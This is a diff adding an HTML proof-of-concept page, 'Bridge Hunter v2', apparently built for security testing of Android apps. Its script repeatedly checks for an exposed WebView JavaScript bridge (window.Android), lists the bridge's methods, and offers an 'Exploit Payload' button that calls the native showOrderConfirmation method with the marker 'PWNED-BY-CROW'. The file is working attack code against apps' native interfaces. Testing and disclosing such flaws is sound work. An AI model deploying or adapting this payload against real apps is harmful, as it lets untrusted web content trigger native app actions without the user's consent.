@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Diagnostics</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: monospace; padding: 20px; background: #222; color: #0f0; word-wrap: break-word; }
+        h1 { color: #fff; border-bottom: 1px solid #555; }
+        .box { border: 1px solid #444; padding: 10px; margin: 10px 0; background: #111; }
+        button { width: 100%; padding: 15px; font-size: 16px; font-weight: bold; margin-bottom: 10px; cursor: pointer; background: #333; color: #fff; border: 1px solid #fff; }
+    </style>
+</head>
+<body>
+    <h1>🕵️ Bridge Hunter v2</h1>
+    
+    <div class="box">
+        <strong>Current URL:</strong><br>
+        <span id="url_display">Loading...</span>
+    </div>
+
+    <div class="box" id="js_status">
+        <strong>JS Status:</strong> ⚠️ Waiting...
+    </div>
+
+    <div class="box" id="bridge_log">
+        <strong>Scanning for Bridge...</strong>
+    </div>
+
+    <button onclick="tryPayload()">Manual Trigger (Order UI)</button>
+    <button onclick="location.reload()">Reload Page</button>
+
+    <script>
+        // 1. Prove JS is running
+        document.getElementById('js_status').innerText = "✅ JavaScript is Running!";
+        document.getElementById('url_display').innerText = window.location.href;
+
+        // 2. The Bridge Hunting Loop
+        let attempts = 0;
+        const logBox = document.getElementById('bridge_log');
+
+        function log(msg) {
+            logBox.innerHTML += "<br>> " + msg;
+        }
+
+        function findBridge() {
+            attempts++;
+            
+            // Check for the standard "Android" name
+            if (window.Android) {
+                document.body.style.background = "#003300"; // Dark green background on success
+                log("✅ FOUND: window.Android");
+                log("Methods: " + Object.keys(window.Android).join(", "));
+                clearInterval(hunter); // Stop hunting
+                return;
+            }
+
+            // Check if it's hidden under a different name
+            // We loop through window keys to find anything suspicious
+            let candidates = [];
+            for (let key in window) {
+                if (key !== 'window' && key !== 'document' && key !== 'location' && key.length > 2) {
+                   // This is a naive check, but helps spot injected objects
+                   // native bridges often don't appear in standard iteration, but we check anyway
+                }
+            }
+            
+            if (attempts % 5 === 0) { // Log every 5th attempt to avoid spam
+                log("Scan #" + attempts + ": Bridge not visible yet...");
+            }
+        }
+
+        // Run the hunt every 500ms
+        var hunter = setInterval(findBridge, 500);
+
+        // 3. The Exploit Payload
+        function tryPayload() {
+            if (window.Android && window.Android.showOrderConfirmation) {
+                window.Android.showOrderConfirmation("PWNED-BY-CROW");
+            } else {
+                alert("Bridge is missing! Cannot trigger.");
+            }
+        }
+    </script>
+</body>
+</html>
